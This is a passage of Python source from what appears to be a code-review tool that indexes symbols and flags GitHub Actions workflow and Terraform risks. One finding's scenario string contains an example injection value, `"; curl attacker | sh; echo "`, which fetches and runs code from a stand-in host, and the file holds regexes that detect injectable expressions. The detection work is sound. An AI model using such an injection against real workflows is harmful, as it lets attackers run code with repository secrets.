                    return candidate
            # `from . import name`: the name may be a module.
            if _name and _name != "*":
                for candidate in (f"{base}/{_name}.py", f"{base}/{_name}/__init__.py"):
                    if candidate in self._modules.values():
                        return candidate
            return None
        return self._modules.get(module) or (self._modules.get(f"{module}.{_name}") if _name else None)

    def _resolve_calls(self, index: FileIndex) -> None:
        by_name: dict[str, list[Symbol]] = {}
        for other in self.index.values():
            for symbol in other.symbols:
                if symbol.kind in ("function", "method", "class"):
                    by_name.setdefault(symbol.name, []).append(symbol)
        local = {symbol.name: symbol for symbol in index.symbols if symbol.kind in ("function", "class")}
        methods: dict[str, list[Symbol]] = {}
        for symbol in index.symbols:
            if symbol.kind == "method":
                methods.setdefault(symbol.name, []).append(symbol)
        for call in index.calls:
            parts = call.callee.split(".")
            leaf = parts[-1]
            targets: list[Symbol] = []
            if len(parts) == 1:
                if leaf in local:
                    targets = [local[leaf]]
                elif leaf in index.imports:
                    module_path, name = index.imports[leaf]
                    if module_path and module_path in self.index:
                        targets = [symbol for symbol in self.index[module_path].symbols if symbol.name == name and symbol.kind in ("function", "class")]
            else:
                head = parts[0]
                if head in ("self", "cls", "this") and leaf in methods:
                    own = call.enclosing.split(".")[0] if call.enclosing else None
                    targets = [symbol for symbol in methods[leaf] if symbol.parent == own] or methods[leaf]
                elif head in index.imports:
                    module_path, name = index.imports[head]
                    if module_path and module_path in self.index:
                        if name == "*" or name == "default":
                            targets = [symbol for symbol in self.index[module_path].symbols if symbol.name == leaf and symbol.kind in ("function", "class", "method")]
                        else:
                            targets = [symbol for symbol in self.index[module_path].symbols if symbol.parent == name and symbol.name == leaf]
                elif head in local and local[head].kind == "class":
                    targets = [symbol for symbol in index.symbols if symbol.parent == head and symbol.name == leaf]
            if not targets and leaf in by_name and len(by_name[leaf]) <= 3 and len(parts) > 1:
                targets = by_name[leaf]  # a method of a known class, reached through an object of unknown type
            call.targets = [symbol.key for symbol in targets][:5]

    # -- queries

    def symbols_named(self, name: str) -> list[Symbol]:
        leaf = name.rsplit(".", 1)[-1]
        out = [symbol for index in self.index.values() for symbol in index.symbols
               if symbol.qualname == name or symbol.name == leaf]
        return sorted(out, key=lambda symbol: (symbol.qualname != name, symbol.path not in self.changed_lines, symbol.path, symbol.line))

    def enclosing(self, path: str, line: int) -> Symbol | None:
        index = self.index.get(path)
        if index is None:
            return None
        best: Symbol | None = None
        for symbol in index.symbols:
            if symbol.kind in ("function", "method", "class") and symbol.line <= line <= symbol.end:
                if best is None or symbol.line >= best.line:
                    best = symbol
        return best

    def callers(self, name: str, *, outside_changes: bool = True) -> list[CallSite]:
        """Call sites that reach a definition of `name` (resolved), then those that name it without resolution."""
        wanted = {symbol.key for symbol in self.symbols_named(name)}
        leaf = name.rsplit(".", 1)[-1]
        resolved: list[CallSite] = []
        by_name: list[CallSite] = []
        for index in self.index.values():
            for call in index.calls:
                if outside_changes and call.line in self.changed_lines.get(call.path, set()):
                    continue
                if wanted and set(call.targets) & wanted:
                    resolved.append(call)
                elif not call.targets and call.callee.rsplit(".", 1)[-1] == leaf:
                    by_name.append(call)
        return resolved + by_name

    def callees(self, name: str) -> list[CallSite]:
        for symbol in self.symbols_named(name):
            index = self.index.get(symbol.path)
            if index is None:
                continue
            return [call for call in index.calls if symbol.line < call.line <= symbol.end]
        return []

    def tests_of(self, name: str) -> list[tuple[str, int, str]]:
        """(path, line, test name) of test functions that call `name`, directly or through a resolved import."""
        out: list[tuple[str, int, str]] = []
        for call in self.callers(name, outside_changes=False):
            if not _TEST_PATH.search(call.path):
                continue
            where = call.enclosing or ""
            entry = (call.path, call.line, where)
            if entry not in out:
                out.append(entry)
        return out

    def overrides(self, symbol: Symbol) -> list[Symbol]:
        """Methods of the same name in other classes of the index (overrides, or siblings in a family)."""
        if symbol.kind != "method":
            return []
        return [other for index in self.index.values() for other in index.symbols
                if other.kind == "method" and other.name == symbol.name and other.key != symbol.key]

    def family_matches(self, family: Family) -> list[tuple[Family, str]]:
        """Families elsewhere that share most of this one's items: (family, "same" | "missing a, b" | "extra c")."""
        out: list[tuple[Family, str]] = []
        mine = set(family.items)
        for index in self.index.values():
            for other in index.families:
                if other.path == family.path and other.line == family.line:
                    continue
                theirs = set(other.items)
                shared = mine & theirs
                if len(shared) < MIN_FAMILY_ITEMS or len(shared) < 0.6 * min(len(mine), len(theirs)):
                    continue
                missing = sorted(mine - theirs)
                extra = sorted(theirs - mine)
                if not missing and not extra:
                    out.append((other, "same"))
                else:
                    out.append((other, "; ".join(part for part in (
                        f"missing {', '.join(repr(item) for item in missing[:4])}" if missing else "",
                        f"extra {', '.join(repr(item) for item in extra[:4])}" if extra else "") if part)))
        return out

    def changed_symbols(self) -> list[Symbol]:
        out: list[Symbol] = []
        for path, lines in self.changed_lines.items():
            index = self.index.get(path)
            if index is None:
                continue
            for symbol in index.symbols:
                if symbol.kind in ("function", "method", "class") and any(symbol.line <= line <= symbol.end for line in lines):
                    out.append(symbol)
        return out

    def signature_before(self, symbol: Symbol) -> str | None:
        base = self.base_index.get(symbol.path)
        if base is None:
            return None
        for other in base.symbols:
            if other.qualname == symbol.qualname:
                return other.signature
        return ""  # new in this change

    # -- views

    def _id(self, prefix: str, key: str) -> str:
        if key not in self._ids:
            number = sum(1 for value in self._ids.values() if value.startswith(prefix)) + 1
            self._ids[key] = f"{prefix}{number}"
        return self._ids[key]

    def symbol_view(self, symbol: Symbol, *, body: bool = False) -> str:
        """One definition: where, signature (and what it was at the base commit), class, overrides, callers, tests."""
        before = self.signature_before(symbol)
        change = ""
        if before == "":
            change = " [new in this change]"
        elif before is not None and before != symbol.signature:
            change = f" [was: {before}]"
        callers = self.callers(symbol.qualname)
        tests = self.tests_of(symbol.qualname)
        overrides = self.overrides(symbol)
        lines = [f"{symbol.path}:{symbol.line}-{symbol.end} {symbol.signature or symbol.name}{change}"]
        if symbol.doc:
            lines.append(f"  doc: {symbol.doc}")
        if symbol.parent:
            lines.append(f"  in class {symbol.parent}")
        if overrides:
            lines.append("  same-named methods: " + "; ".join(f"{other.path}:{other.line} {other.qualname}" for other in overrides[:4]))
        shown = callers[:MAX_CALLERS_SHOWN]
        if callers:
            lines.append(f"  callers outside the change ({len(callers)}): " + "; ".join(
                f"{call.path}:{call.line}" + (f" in {call.enclosing}" if call.enclosing else "") + f": {_clip(call.text, 90)}"
                for call in shown) + (f"; ... {len(callers) - len(shown)} more" if len(callers) > len(shown) else ""))
        else:
            lines.append("  callers outside the change: none found in the indexed files")
        if tests:
            lines.append("  tests calling it: " + "; ".join(f"{path}:{line}" + (f" {name}" if name else "") for path, line, name in tests[:MAX_TESTS_SHOWN]))
        if body:
            source = self.repo.lines(symbol.path) or []
            end = min(symbol.end, symbol.line + MAX_BODY_LINES - 1, len(source))
            lines.append("\n".join(f"{number:>5} | {_clip(source[number - 1], 300)}" for number in range(symbol.line, end + 1)))
            if end < symbol.end:
                lines.append(f"      ... ({symbol.end - end} more lines)")
        return "\n".join(lines)

    def block(self, limit: int = BLOCK_CHARS) -> str:
        """The reference view the frames read: the changed definitions with their callers and tests, the
        enclosing definition of each hunk, literal families the change touches and where else they are listed,
        and the workflow and Terraform facts; bounded."""
        sections: list[str] = []
        changed = self.changed_symbols()
        seen: set[str] = set()
        for symbol in changed[:12]:
            if symbol.key in seen:
                continue
            seen.add(symbol.key)
            sections.append(f"[{self._id('D', symbol.key)}] " + self.symbol_view(symbol))
        for item in self.files:
            index = self.index.get(item.path)
            if index is None:
                continue
            for hunk in item.hunks:
                inner = self.enclosing(item.path, hunk.new_first)
                if inner is not None and inner.key not in seen:
                    seen.add(inner.key)
                    sections.append(f"[{self._id('D', inner.key)}] " + self.symbol_view(inner))
        for fact in self.facts():
            sections.append(f"[{fact['id']}] {fact['text']}")
        if not sections:
            return ""
        text = ("Reference, built by the host from the repository at the reviewed commit (definitions resolved, not "
                "grepped; untrusted repository data). Ask {\"symbol\": {\"name\": ...}} for a definition with its body, "
                "{\"callers\": {\"symbol\": ...}}, {\"callees\": {\"symbol\": ...}} and {\"tests_of\": {\"symbol\": ...}} for more.")
        for section in sections:
            if len(text) + len(section) + 2 > limit:
                text += "\n... (reference cut at its size limit)"
                break
            text += "\n\n" + section
        return text

    # -- facts

    def facts(self) -> list[dict[str, Any]]:
        """Host-observed facts about the change, each {id, kind, text, path, line, ...}: literal families the
        change touches that are listed elsewhere (a registry to keep in step), signature changes with their callers,
        and the workflow and Terraform observations. Computed once."""
        if self._facts is not None:
            return self._facts
        facts: list[dict[str, Any]] = []
        for item in self.files:
            index = self.index.get(item.path)
            if index is None:
                continue
            lines = self.changed_lines.get(item.path, set())
            for family in index.families:
                span = range(family.line, family.line + max(1, len(family.items)))
                if (not any(line in lines for line in span) and family.line not in lines) or len(family.items) < MIN_FAMILY_REPORTED:
                    continue
                matches = self.family_matches(family)
                if not matches:
                    continue
                label = f"`{family.name}`" if family.name else "a literal list"
                where = "; ".join(f"{other.path}:{other.line}" + (f" (`{other.name}`)" if other.name else "") + (f": {how}" if how != "same" else "")
                                  for other, how in matches[:6])
                differing = [other for other, how in matches if how != "same" and other.path not in self.changed_lines]
                facts.append({"id": self._id("F", f"{family.path}:{family.line}"), "kind": "family", "shape": "family", "path": family.path,
                              "line": family.line, "items": list(family.items), "matches": [(other.path, other.line, how) for other, how in matches],
                              "text": f"The change edits the literal family {label} at {family.path}:{family.line} ({', '.join(repr(item) for item in family.items[:6])}"
                                      + (", ..." if len(family.items) > 6 else "") + f"); the same family is listed at {where}"
                                      + (". A file not in this change lists it differently." if differing else ".")})
        for symbol in self.changed_symbols():
            before = self.signature_before(symbol)
            if before and before != symbol.signature:
                callers = self.callers(symbol.qualname)
                facts.append({"id": self._id("F", f"sig:{symbol.key}"), "kind": "signature", "shape": "signature", "path": symbol.path, "line": symbol.line,
                              "text": f"The signature of {symbol.qualname} changed: was `{before}`, now `{symbol.signature}`; "
                                      + (f"{len(callers)} caller(s) outside the change: " + "; ".join(f"{call.path}:{call.line}" for call in callers[:8])
                                         if callers else "no caller outside the change in the indexed files")})
        facts += self.workflow_facts()
        facts += self.terraform_facts()
        self._facts = facts
        return facts

    def workflow_facts(self) -> list[dict[str, Any]]:
        out: list[dict[str, Any]] = []
        for path, node in self.workflows.items():
            if path not in self.changed_lines:
                continue
            try:
                out += _workflow_facts(self, path, node)
            except Exception:
                continue
        return out

    def terraform_facts(self) -> list[dict[str, Any]]:
        out: list[dict[str, Any]] = []
        try:
            out += _terraform_facts(self)
        except Exception:
            pass
        return out

    def structural_findings(self) -> list[dict[str, Any]]:
        """The facts that are findings by themselves, in the deep pass's finding shape, each with citations the
        host checked (a quote at its line). They are candidates: the verifier judges them like any other."""
        out: list[dict[str, Any]] = []
        for fact in self.facts():
            finding = fact.get("finding")
            if not finding:
                continue
            citations = []
            for cite_path, cite_line in fact.get("cite", []):
                source = self.repo.lines(cite_path) or []
                if 1 <= cite_line <= len(source):
                    citations.append({"path": cite_path, "line": cite_line, "quote": source[cite_line - 1].strip()})
            if not citations:
                continue
            out.append({**finding, "file": fact["path"], "line": fact["line"], "citations": citations, "shape": fact.get("shape", ""),
                        "source": "deep:structure", "reviewers": ["deep:structure"], "beyond_diff": any(
                            cite["path"] != fact["path"] or cite["line"] not in self.changed_lines.get(cite["path"], set())
                            for cite in citations), "confidence": finding.get("confidence", 0.7)})
        return out


def _module_map(tracked: Iterable[str]) -> dict[str, str]:
    """Dotted module name -> path, for every Python file under every plausible source root (the longest dotted
    name wins a collision), plus every path by itself for TS resolution."""
    out: dict[str, str] = {}
    for path in tracked:
        out[path] = path
        if not _PY.search(path):
            continue
        parts = path[:-3].split("/")
        if parts[-1] == "__init__":
            parts = parts[:-1]
        for start in range(len(parts)):
            dotted = ".".join(parts[start:])
            if dotted and (dotted not in out or start == 0):
                out.setdefault(dotted, path)
    return out


# --- Workflow and Terraform facts ------------------------------------------------------------------------------


_OIDC_USERS = re.compile(r"configure-aws-credentials|google-github-actions/auth|azure/login|actions/attest|sigstore|"
                         r"slsa-framework|pypa/gh-action-pypi-publish|cosign|actions/deploy-pages|aws-actions/", re.I)
_OIDC_RUN = re.compile(r"--provenance|gh attestation|id-token|ACTIONS_ID_TOKEN_REQUEST", re.I)
_USER_CONTROLLED = re.compile(r"\$\{\{\s*(?:github\.event\.(?:issue|comment|pull_request|review|review_comment|discussion|"
                              r"commits\[[^\]]*\]|head_commit|inputs)\.[\w.\[\]]*(?:title|body|message|name|ref|label|email|login|"
                              r"default_branch|description)|github\.head_ref|inputs\.[\w.]+|github\.event\.inputs\.[\w.]+)\s*\}\}", re.I)
_SAME_REPO_GUARD = re.compile(r"head\.repo\.full_name\s*==\s*github\.repository|head\.repo\.fork\s*==\s*false|"
                              r"!\s*github\.event\.pull_request\.head\.repo\.fork|repo\.owner\.login\s*==|github\.repository_owner\s*==", re.I)


def _permissions(value: Any) -> dict[str, str]:
    if isinstance(value, dict):
        return {str(key): str(item) for key, item in value.items() if item is not None}
    return {}


def _workflow_facts(reference: Reference, path: str, node: YamlNode) -> list[dict[str, Any]]:
    doc = node.value
    changed = reference.changed_lines.get(path, set())
    added_file = all(line.kind == "+" for item in reference.files if item.path == path for hunk in item.hunks for line in hunk.lines)
    out: list[dict[str, Any]] = []
    jobs = doc.get("jobs") if isinstance(doc.get("jobs"), dict) else {}
    triggers = doc.get("on") if doc.get("on") is not None else doc.get(True)
    trigger_names: list[str] = []
    if isinstance(triggers, dict):
        trigger_names = [str(key) for key in triggers]
    elif isinstance(triggers, list):
        trigger_names = [str(item) for item in triggers]
    elif isinstance(triggers, str):
        trigger_names = [triggers]
    top_permissions = _permissions(doc.get("permissions"))
    top_line = node.lines.get("permissions")
    # Where a job's entries are, for citations.
    text_lines = reference.repo.lines(path) or []

    def line_of(pattern: str, start: int = 1, end: int | None = None) -> int | None:
        for number in range(start, min(end or len(text_lines), len(text_lines)) + 1):
            if re.search(pattern, text_lines[number - 1]):
                return number
        return None

    uses_oidc = False
    external_calls: list[str] = []  # reusable workflows of other repositories this one hands its permissions to
    for job in jobs.values() if isinstance(jobs, dict) else []:
        if not isinstance(job, dict):
            continue
        if isinstance(job.get("uses"), str) and job["uses"].startswith("./"):
            called = reference.repo.lines(job["uses"].split("@")[0].lstrip("./")) or []
            if any(re.search(r"id-token", line) for line in called):
                uses_oidc = True
        elif isinstance(job.get("uses"), str):
            uses_oidc = True  # a reusable workflow elsewhere: unknown, assume it may need it
            external_calls.append(job["uses"])
        for step in job.get("steps") or []:
            if not isinstance(step, dict):
                continue
            if isinstance(step.get("uses"), str) and _OIDC_USERS.search(step["uses"]):
                uses_oidc = True
            if isinstance(step.get("run"), str) and _OIDC_RUN.search(step["run"]):
                uses_oidc = True
    # 1. id-token: write granted but nothing uses OIDC.
    grants = []
    if top_permissions.get("id-token") == "write" and top_line:
        grants.append(line_of(r"id-token:\s*write", top_line, top_line + 12) or top_line)
    for job in jobs.values() if isinstance(jobs, dict) else []:
        if isinstance(job, dict) and _permissions(job.get("permissions")).get("id-token") == "write":
            grants.append(line_of(r"id-token:\s*write") or 1)
    for line in grants:
        if not uses_oidc and (added_file or line in changed):
            out.append({"id": reference._id("W", f"{path}:idtoken:{line}"), "kind": "workflow", "shape": "idtoken", "path": path, "line": line,
                        "cite": [(path, line)],
                        "text": f"{path}:{line} grants `id-token: write`, but no step uses an OIDC action or command (configure-aws-credentials, "
                                "google-github-actions/auth, azure/login, attestations, --provenance): the permission is unnecessary.",
                        "finding": {"level": "low", "severity": "minor", "finder_level": "low", "category": "security",
                                    "claim": "The workflow grants `id-token: write` although no step requests an OIDC token.",
                                    "why": "An unused `id-token: write` widens what a compromised step can do (it can mint identity tokens for cloud providers); the least privilege is not to grant it.",
                                    "scenario": "", "suggested_fix": "Remove `id-token: write` from the permissions, or scope it to the job that authenticates with OIDC.",
                                    "unpinned": None, "consequence": ""}})
        elif external_calls and (added_file or line in changed):
            # 1b. The grant is the ceiling of a reusable workflow in another repository: whatever that workflow's code
            # does at its ref can mint cloud identity tokens as this repository.
            called = external_calls[0]
            mutable = bool(re.search(r"@(main|master|develop|v?\d+)$", called))
            out.append({"id": reference._id("W", f"{path}:idtoken-external:{line}"), "kind": "workflow", "shape": "idtoken-external", "path": path, "line": line,
                        "cite": [(path, line)],
                        "text": f"{path}:{line} grants `id-token: write` to the external reusable workflow `{called}`"
                                + (" (a mutable ref)" if mutable else "") + ": nothing in this repository shows that workflow needs an OIDC token.",
                        "finding": {"level": "low", "severity": "minor", "finder_level": "low", "category": "security",
                                    "claim": f"The workflow grants `id-token: write` to the external reusable workflow `{called}`.",
                                    "why": "The caller's permissions are the ceiling of the called workflow: with `id-token: write` the code behind that reference"
                                           + (", which can change under the mutable ref," if mutable else "")
                                           + " can mint OIDC identity tokens for cloud providers as this repository, whether or not it needs them today.",
                                    "scenario": "", "suggested_fix": "Grant only what the called workflow documents it needs; drop `id-token: write` unless it authenticates with OIDC"
                                                                      + (", and pin the reference to a commit SHA." if mutable else "."),
                                    "unpinned": None, "consequence": ""}})
    # 2. No permissions block where sibling workflows have one (a convention of this repository).
    if jobs and not top_permissions and not any(isinstance(job, dict) and job.get("permissions") for job in jobs.values()):
        siblings = [other for other in reference.repo.files() if _WORKFLOW.search(other) and other != path]
        with_permissions = [other for other in siblings if any(re.match(r"^\s*permissions:", line) for line in (reference.repo.lines(other) or []))]
        if len(with_permissions) >= 2 and (added_file or any(line in changed for line in (node.lines.get("jobs") or 0,))):
            sibling = with_permissions[0]
            sibling_line = next((number for number, line in enumerate(reference.repo.lines(sibling) or [], 1) if re.match(r"^\s*permissions:", line)), 1)
            line = node.lines.get("jobs") or 1
            out.append({"id": reference._id("W", f"{path}:permissions"), "kind": "workflow", "shape": "permissions", "path": path, "line": line,
                        "cite": [(path, line), (sibling, sibling_line)],
                        "text": f"{path} declares no `permissions` block, while {len(with_permissions)} sibling workflows do (for example {sibling}:{sibling_line}): "
                                "GITHUB_TOKEN keeps the repository's default permissions here.",
                        "finding": {"level": "low", "severity": "minor", "finder_level": "low", "category": "security",
                                    "claim": "The workflow sets no `permissions`, unlike its sibling workflows, so GITHUB_TOKEN runs with the repository default permissions.",
                                    "why": f"{len(with_permissions)} other workflows in .github/workflows restrict GITHUB_TOKEN explicitly; this one does not, so its token may have write access it does not need.",
                                    "scenario": "", "suggested_fix": "Add a top-level `permissions:` block with the least the jobs need (for example `contents: read`).",
                                    "unpinned": None, "consequence": ""}})
    # 3. pull_request_target (or a comment trigger) that checks out the pull request head without a same-repository guard.
    risky = [name for name in trigger_names if name in ("pull_request_target", "issue_comment", "pull_request_review", "pull_request_review_comment")]
    if risky:
        for job_name, job in (jobs.items() if isinstance(jobs, dict) else []):
            if not isinstance(job, dict):
                continue
            guard_texts = [str(job.get("if") or "")]
            for step in job.get("steps") or []:
                if not isinstance(step, dict):
                    continue
                guard_texts.append(str(step.get("if") or ""))
                ref = str((step.get("with") or {}).get("ref") or "") if isinstance(step.get("with"), dict) else ""
                if isinstance(step.get("uses"), str) and step["uses"].startswith("actions/checkout") and re.search(r"head\.(sha|ref)|head_ref", ref):
                    if not any(_SAME_REPO_GUARD.search(text) for text in guard_texts):
                        line = line_of(re.escape(ref.split("}}")[0][-30:])) or line_of(r"actions/checkout") or 1
                        if added_file or line in changed or any(number in changed for number in range(max(1, line - 3), line + 3)):
                            out.append({"id": reference._id("W", f"{path}:fork:{job_name}"), "kind": "workflow", "shape": "fork-checkout", "path": path, "line": line,
                                        "cite": [(path, line)],
                                        "text": f"{path}:{line} ({job_name}) runs on {', '.join(risky)} and checks out the pull request head without a same-repository guard "
                                                "(no `head.repo.full_name == github.repository` condition).",
                                        "finding": {"level": "medium", "severity": "minor", "finder_level": "medium", "category": "security",
                                                    "claim": f"Job {job_name} checks out the pull request head under a {risky[0]} trigger without a same-repository guard.",
                                                    "why": f"{risky[0]} runs with the base repository's GITHUB_TOKEN and secrets; checking out a fork's head and running its code lets a fork's pull request run arbitrary code with that token.",
                                                    "scenario": "A pull request from a fork modifies a script this job runs after checkout; the job executes it with the repository's token and secrets.",
                                                    "suggested_fix": "Guard the job with `if: github.event.pull_request.head.repo.full_name == github.repository`, or use the `pull_request` trigger for untrusted code.",
                                                    "unpinned": None, "consequence": ""}})
    # 4. User-controlled expressions interpolated into a run script (expression injection).
    for job_name, job in (jobs.items() if isinstance(jobs, dict) else []):
        if not isinstance(job, dict):
            continue
        for step in job.get("steps") or []:
            if not isinstance(step, dict) or not isinstance(step.get("run"), str):
                continue
            match = _USER_CONTROLLED.search(step["run"])
            if not match:
                continue
            expression = match.group(0)
            line = line_of(re.escape(expression[:40]))
            if line is None or not (added_file or line in changed):
                continue
            out.append({"id": reference._id("W", f"{path}:inject:{line}"), "kind": "workflow", "shape": "run-injection", "path": path, "line": line,
                        "cite": [(path, line)],
                        "text": f"{path}:{line} ({job_name}) interpolates `{_clip(expression, 80)}` into a run script: the value is user-controlled and is substituted before the shell parses it.",
                        "finding": {"level": "medium", "severity": "minor", "finder_level": "medium", "category": "security",
                                    "claim": f"A run step interpolates the user-controlled expression `{_clip(expression, 70)}` directly into the shell script.",
                                    "why": "GitHub substitutes `${{ }}` expressions into the script text before the shell runs it, so quotes and `$()` in the value become shell syntax.",
                                    "scenario": "A pull request title (or body, branch name, comment) containing `\"; curl attacker | sh; echo \"` runs that command in the job.",
                                    "suggested_fix": "Pass the value through an environment variable (`env: TITLE: ${{ ... }}`) and reference `\"$TITLE\"` in the script.",
                                    "unpinned": None, "consequence": ""}})
    return out


def _terraform_facts(reference: Reference) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    all_blocks = [block for blocks in reference.terraform.values() for block in blocks]
    if not all_blocks:
        return out
    # 1. A resource removed by the change is still referenced in a file that keeps it.
    for item in reference.files:
        if not _TF.search(item.path):
            continue
        for text in reference.removed_text.get(item.path, []):
            match = _TF_BLOCK.match(text)
            if not match or match.group(1) not in ("resource", "data"):
                continue
            address = (f"{match.group(2)}.{match.group(3)}" if match.group(1) == "resource" else f"data.{match.group(2)}.{match.group(3)}")
            still = [block for block in all_blocks if address in block.refs and not (block.kind == match.group(1) and block.address == address)]
            if any(block.address == address for block in all_blocks):
                continue  # moved, not removed
            for block in still[:3]:
                line = next((number for number, source in enumerate(reference.repo.lines(block.path) or [], 1)
                             if block.line <= number <= block.end and address in source), block.line)
                out.append({"id": reference._id("T", f"ref:{address}:{block.path}"), "kind": "terraform", "shape": "tf-removed-ref", "path": block.path, "line": line,
                            "cite": [(block.path, line)],
                            "text": f"The change removes `{address}` from {item.path}, but {block.path}:{line} ({block.address}) still references it.",
                            "finding": {"level": "medium", "severity": "minor", "finder_level": "medium", "category": "correctness",
                                        "claim": f"`{block.address}` still references `{address}`, which this change removes.",
                                        "why": "A reference to a resource that no longer exists fails at plan time.",
                                        "scenario": f"`terraform plan` fails: `{address}` is referenced by {block.address} but is not declared.",
                                        "suggested_fix": f"Update or remove the reference in {block.path}, or keep `{address}`.",
                                        "unpinned": None, "consequence": ""}})
    # 2. A new resource of a type whose siblings carry prevent_destroy, without it.
    for path, blocks in reference.terraform.items():
        changed = reference.changed_lines.get(path, set())
        for block in blocks:
            if block.kind != "resource" or block.line not in changed:
                continue
            siblings = [other for other in all_blocks if other.kind == "resource" and other.type == block.type and other.address != block.address]
            protected = [other for other in siblings if (other.nested.get("lifecycle") or {}).get("prevent_destroy", "").strip() == "true"]
            if len(protected) >= 2 and (block.nested.get("lifecycle") or {}).get("prevent_destroy", "").strip() != "true":
                other = protected[0]
                other_line = next((number for number, source in enumerate(reference.repo.lines(other.path) or [], 1)
                                   if other.line <= number <= other.end and "prevent_destroy" in source), other.line)
                out.append({"id": reference._id("T", f"protect:{block.address}"), "kind": "terraform", "shape": "tf-prevent-destroy", "path": path, "line": block.line,
                            "cite": [(path, block.line), (other.path, other_line)],
                            "text": f"{path}:{block.line} adds `{block.address}` without `lifecycle {{ prevent_destroy = true }}`, which {len(protected)} sibling "
                                    f"resources of type {block.type} set (for example {other.address} at {other.path}:{other_line}).",
                            "finding": {"level": "low", "severity": "minor", "finder_level": "low", "category": "correctness",
                                        "claim": f"`{block.address}` lacks the `prevent_destroy` lifecycle rule its sibling {block.type} resources set.",
                                        "why": "Sibling resources of the same type are protected from accidental destruction; this one is not, so a plan that replaces it destroys it.",
                                        "scenario": "", "suggested_fix": "Add `lifecycle { prevent_destroy = true }` as the siblings do, or state why this resource may be destroyed.",
                                        "unpinned": None, "consequence": ""}})
    return out


# --- Serving requests ------------------------------------------------------------------------------------------


def serve(reference: Reference, kind: str, args: dict[str, Any]) -> tuple[str, str] | None:
    """Answer a `symbol`, `callers`, `callees` or `tests_of` request from the index: (title, body), or None when the
    index does not know the name (the caller falls back to a text search)."""
    name = args.get("symbol") if kind != "symbol" else (args.get("name") or args.get("symbol"))
    if not isinstance(name, str) or not name.strip():
        return None
    name = name.strip()
    if kind == "symbol":
        symbols = reference.symbols_named(name)
        if not symbols:
            return None
        parts = [reference.symbol_view(symbol, body=True) for symbol in symbols[:3]]
        more = f"\n... {len(symbols) - 3} more definitions of {name.rsplit('.', 1)[-1]}" if len(symbols) > 3 else ""
        return f"symbol {name} -> {len(symbols)} definition(s)", "\n\n".join(parts) + more
    if kind == "callers":
        calls = reference.callers(name, outside_changes=False)
        if not calls:
            return None  # a defined name nothing calls (a constant, a class only subclassed): the text search finds its uses
        shown = calls[:MAX_CALLERS_SHOWN * 3]
        body = "\n".join(f"{call.path}:{call.line}" + (f" in {call.enclosing}" if call.enclosing else "")
                         + (" (resolved)" if call.targets else " (by name)") + f": {_clip(call.text, 140)}" for call in shown) or "no call site in the indexed files"
        return f"callers {name} -> {len(calls)} call sites" + (" (more not shown)" if len(calls) > len(shown) else ""), body
    if kind == "callees":
        symbols = reference.symbols_named(name)
        if not symbols:
            return None
        calls = reference.callees(name)
        body = "\n".join(f"{call.path}:{call.line}: {call.callee}(...)" + (" -> " + ", ".join(call.targets[:3]) if call.targets else " (unresolved)")
                         for call in calls[:40]) or "no calls inside it"
        return f"callees of {symbols[0].qualname} -> {len(calls)} calls", body
    if kind == "tests_of":
        if not reference.symbols_named(name) and not reference.callers(name, outside_changes=False):
            return None
        tests = reference.tests_of(name)
        body = "\n".join(f"{path}:{line}" + (f" {test}" if test else "") for path, line, test in tests[:30]) or "no test calls it in the indexed files"
        return f"tests_of {name} -> {len(tests)} test(s)", body
    return None
